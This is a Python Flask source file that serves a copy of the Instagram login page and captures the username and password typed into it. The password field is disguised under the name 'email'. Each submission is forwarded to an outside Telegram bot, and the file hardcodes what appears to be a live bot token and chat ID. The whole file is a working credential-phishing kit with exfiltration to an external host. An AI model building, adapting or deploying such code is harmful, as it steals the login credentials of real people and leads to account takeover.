from flask import Flask, render_template, request, jsonify
import requests

app = Flask(__name__)

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual Telegram bot token
TELEGRAM_BOT_TOKEN = '6752205626:AAFmvEgnj6j_jl1WmqSowQeSAQqYW_yo4hQ'
TELEGRAM_CHAT_ID = '5043961881'  # Replace with your actual Telegram chat ID

# Define the form template
form_template = """

<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<title>Instagram Login Page</title>
	<link rel="stylesheet" href="styles.css">
</head>
<body>

<div class="wrapper">
	<div class="header">
		<div class="top">
			<!-- Instagram logo -->
			<div class="logo">
				<img src="instagram.png" alt="instagram" style="width: 175px;">
			</div>

			<!-- Login form -->
			<div class="form">
				<div class="input_field">
					<input type="text"  id="name" name="name" placeholder="Phone number, username, or email" class="input">
				</div>
				<div class="input_field">
					<input type="password" id="email" name="email" placeholder="Password" class="input">
				</div>
<!--				<div class="btn"><a href="#">Log In</a></div>-->
                <input class="btn" type="submit" value="Submit">

			</div>

			<!-- "OR" section with Facebook login and Forgot password link -->
			<div class="or">
				<div class="line"></div>
				<p>OR</p>
				<div class="line"></div>
			</div>
			<div class="dif">
				<div class="fb">
					<img src="facebook.png" alt="facebook">
					<p>Log in with Facebook</p>
				</div>
				<div class="forgot">
					<a href="#">Forgot password?</a>
				</div>
			</div>
		</div>

		<!-- Sign up link -->
		<div class="signup">
			<p>Don't have an account? <a href="#">Sign up</a></p>
		</div>

		<!-- App download section -->
		<div class="apps">
			<p>Get the app.</p>
			<div class="icons">
				<a href="#"><img src="appstore.png" alt="appstore"></a>
				<a href="#"><img src="googleplay.png" alt="googleplay"></a>
			</div>
		</div>
	</div>

	<!-- Footer with links and copyright information -->
	<div class="footer">
		<div class="links">
			<ul>
				<li><a href="#">ABOUT US</a></li>
				<li><a href="#">SUPPORT</a></li>
				<li><a href="#">PRESS</a></li>
				<!-- Other links... -->
			</ul>
		</div>
		<div class="copyright">
			© 2019 INSTAGRAM
		</div>
	</div>
</div>

</body>
</html>

"""

# Route for displaying the form
@app.route('/')
def show_form():
    return form_template

# Route for handling form submission
@app.route('/submit', methods=['POST'])
def submit_form():
    try:
        name = request.form['name']
        email = request.form['email']

        # Send the form data to the Telegram bot
        message = f"New form submission:\nName: {name}\nEmail: {email}"
        send_message_to_telegram(message)

        return jsonify({'status': 'success'})
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)})

def send_message_to_telegram(message):
    telegram_api_url = f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    params = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response = requests.post(telegram_api_url, params=params)
    response.raise_for_status()

# Main function
if __name__ == "__main__":
    app.run(port=5000)
